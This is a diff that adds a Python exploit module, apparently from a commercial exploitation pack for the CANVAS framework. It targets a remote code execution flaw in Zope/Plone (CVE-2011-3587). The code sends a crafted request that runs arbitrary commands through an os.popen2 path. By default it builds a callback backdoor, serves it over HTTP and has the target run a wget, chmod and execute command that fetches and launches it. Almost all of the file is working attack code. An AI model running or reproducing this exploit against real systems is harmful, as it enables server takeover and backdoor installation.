@@ -1,0 +1,265 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2012
+#
+
+import sys
+import re
+import random
+import time
+import thread
+import struct
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import canvasengine
+import urllib
+
+# GUI info
+NAME = "Zope/Plone Remote Code Execution Vulnerability"
+DESCRIPTION = "Remote code execution vulnerability in Zope/Plone"
+VERSION = "0.1"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Zope"
+DOCUMENTATION["Date public"] = "2011.12.21"
+DOCUMENTATION["VersionsAffected"] = "Zope 2.12.x 2.13.x"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["References"] = "http://www.npenetrable.com/?p=32"
+DOCUMENTATION["CVE Name"] = "CVE-2011-3587"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3587"
+DOCUMENTATION["Notes"] = ""
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+NOTES = ""
+
+CHANGELOG = ""
+
+
+class theexploit(tcpexploit):    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.setInfo(DESCRIPTION)
+    self.name = NAME
+    self.TROJANMODE = 0
+    self.host = "" 
+    self.port = 8080 
+    self.cmd = ""        
+    self.trojanname = "mosdef"
+    self.path = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_zopeplone/"
+    return    
+	
+	
+  def neededListenerTypes(self):
+    return [canvasengine.LINUXMOSDEF_INTEL]
+
+
+  def maketrojan(self):
+    t_os = canvasos('Linux')
+    t_os.arch = "X86"
+    from MOSDEF import makeexe
+    from MOSDEF.cc import threadsafe_cc_main
+    self.log('[D2] Compiling Unix trojan')
+    infilename = "backdoors/cback_mmap_rwx.c"
+    vars = {}
+    vars['CBACK_PORT'] = self.callback.port
+    vars['CBACK_ADDR'] = str2int32(socket.inet_aton(self.callback.ip))
+    self.log('[D2] Callback address is %s' % vars['CBACK_ADDR'])
+    cc_command = []
+    for var in vars:
+      cc_command += ["-D","%s=%s" % (var,vars[var])]
+    cc_command += ["-d", "-v","-m","Linux" ,"-p", "i386","-k", "None", infilename]
+    self.log("[D2] CC command: %s" % cc_command)
+    mosdeftrojan = threadsafe_cc_main(cc_command)
+    if not mosdeftrojan:
+      self.log('[D2] Was unable to create trojan!')
+      return ''
+    self.log('[D2] Length of CC compiled trojan: %s' % len(mosdeftrojan))
+    self.log('[D2] Writing out %d bytes to %s' % (len(mosdeftrojan), self.trojanname))        
+    file(self.path+self.trojanname, "wb").write(mosdeftrojan)
+    ret = len(mosdeftrojan) != 0
+    return ret
+
+
+  def makesploit(self, clientheader, clientbody):
+    from libs.spkproxy import header, body
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("Sending MOSDEF trojan")
+      f = open(self.path+self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.path+self.trojanname)
+      self.log("Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+
+  #################################################################################################################
+  # Code from httpserver.py
+  def listen(self):
+    s = self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      if self.port < 1024:
+        self.log('[D2] Cannot listen on port %d - perhaps we need to be root or that port is already bound? ' \
+          'you can try to bind to a higher port' % self.port)
+      else:
+        self.log('[D2] Cannot listen on port %d - perhaps that port is already bound ?' % self.port)
+        return 0
+    s.set_timeout(5)
+    self.s = s
+    return s
+
+  def accept(self, s=None):
+    """
+      Try to accept one connection
+      returns true if we found one
+    """
+    #we loop on this ,so no annoying printouts here
+    #self.log("Accepting connection")
+    if s == None:
+      s = self.s
+    try:
+      infd,addr = s.accept()
+    #except timeoutsocket.Timeout:
+    except Exception, e:
+      #self.log("Timed out - no accept yet")
+      return
+    if infd == -1:
+      return
+    #else we have an infd
+    self.handle(infd)
+    return True #handled connection
+
+  def handle(self, infd):
+    self.log('[D2] Handling connection')
+    clientheader = header(state = "SERVER")
+    clientheader.ssl = self.ssl
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log('[D2] Reading body')
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log('[D2] Read body')
+    self.log('[D2] Creating exploit response')
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log('[D2] Responding')
+    bodydata = ''.join(servbody.data)
+    #now we respond...
+    response = ''
+    response += '%s %s %s\r\n' % (servheader.version, servheader.status, servheader.msg)
+    #self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log('[D2] Sending header data of %d bytes' % len(response))
+    chunked = 0 #for now, eventually we'll send random chunks down the pipe.\..
+    if not chunked:
+      response += 'Content-Length: '+str(len(bodydata))+'\r\n'
+    response += '\r\n'
+    response += ''.join(bodydata)
+    self.log('[D2] Total response length is %d bytes' % len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log('[D2] Connection closed by peer')
+    self.log('[D2] Response sent')
+    infd.close() #connection close - later on we'll keep it.
+    return
+  #
+  #################################################################################################################
+
+  def startHTTPServer(self):
+    s = self.listen()
+    if not s:
+      self.log('[D2] Failed to listen - not running')
+      return 0
+    while 1:
+      if self.state == self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    return 1
+
+
+  def remote_exec(self):
+      self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+      self.log("Attacking %s:%d"%(self.host, self.port))                	
+
+      cmd = urllib.quote(self.cmd)
+              
+      sploitstring = "GET /p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=%s HTTP/1.1\r\n" % cmd
+      sploitstring += "Host: %s:%d\r\n" % (self.host, self.port)
+      sploitstring += "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\r\n"		
+      sploitstring += "\r\n"			             
+		
+      try:
+        s = self.gettcpsock()
+        s.connect((self.host, self.port))
+        self.websend(s, sploitstring)
+        data = self.webrecv(s)
+      except:
+        self.log("[D2] connection error (host:%s port:%d ssl:%d" % (self.host,self.port,self.ssl))        		  
+		                		          
+      self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))  
+
+    
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port",self.port))    
+    if (self.argsDict.get("cmd", self.cmd) == ''):
+      self.TROJANMODE = 1
+      self.cmd = 'wget -O /tmp/%s %s/%s; chmod +x /tmp/%s; /tmp/%s' % (self.trojanname, self.callback.ip, self.trojanname, self.trojanname, self.trojanname)
+      thread.start_new_thread(self.startHTTPServer,())
+    else:
+      self.cmd = self.argsDict.get("cmd", self.cmd)
+
+
+  def run(self):
+    self.getargs()
+    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    time.sleep(5)
+    if (self.TROJANMODE == 1):
+      self.log('[D2] Create, download and execute Linux mosdef payload')
+    self.remote_exec()
+    if (self.TROJANMODE == 1):
+      while 1:
+        time.sleep(1)
+    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
+    return 1
+
+
+  def usage(self):
+    print "Usage: "+sys.argv[0]+" -t target [-p port:8080] -l localip -d localport -O cmd:<command> " 
+    print "If cmd parameter is null, a Linux mosdef payload will be used."
+    sys.exit(0)
+
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
